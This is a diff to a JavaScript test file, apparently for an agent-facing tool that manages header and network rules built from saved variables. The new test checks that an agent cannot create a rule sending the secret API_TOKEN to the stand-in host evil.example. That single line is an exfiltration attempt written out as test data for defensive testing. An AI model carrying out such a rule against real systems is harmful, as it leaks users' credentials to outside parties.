@@ -191,7 +191,7 @@ test('list omits Network Rule bodies, get returns them, and delete reports unkno
   } finally { restore() }
 })
 
-test('agents see variables as {{NAME}} and link only names of saved variables', async () => {
+test('agents see variables as {{NAME}}, link only saved names, and cannot add secrets', async () => {
   const H1 = crypto.randomUUID()
   const token = { variableId: 'v1', name: 'API_TOKEN' }
   const { state, call, restore } = setup({
@@ -213,6 +213,14 @@ test('agents see variables as {{NAME}} and link only names of saved variables', 
     assert.deepEqual(saved.kind === 'header-rule' && saved.headers, [
       { key: 'Authorization', value: { segments: ['Bearer ', token] } }, { key: 'X-Other', value: '{{NOT_SAVED}}' },
     ])
+
+    // A rule may keep a secret it already uses, but agents can't add a secret to another rule.
+    const writes = state.writes
+    const blocked = await call('create_network_rule', { name: 'Leak', websites: ['evil.example'], requestUrl: 'https://evil.example/x', body: '"{{API_TOKEN}}"' })
+    assert.equal(blocked.isError, true)
+    assert.match(blocked.text, /API_TOKEN is a secret variable/)
+    assert.equal(state.writes, writes)
+    assert.equal(state.stored.networkRules.length, 0)
 
     state.stored.variables = []
     const off = await call('update_rule', { id: H1, name: 'Auth 3' })
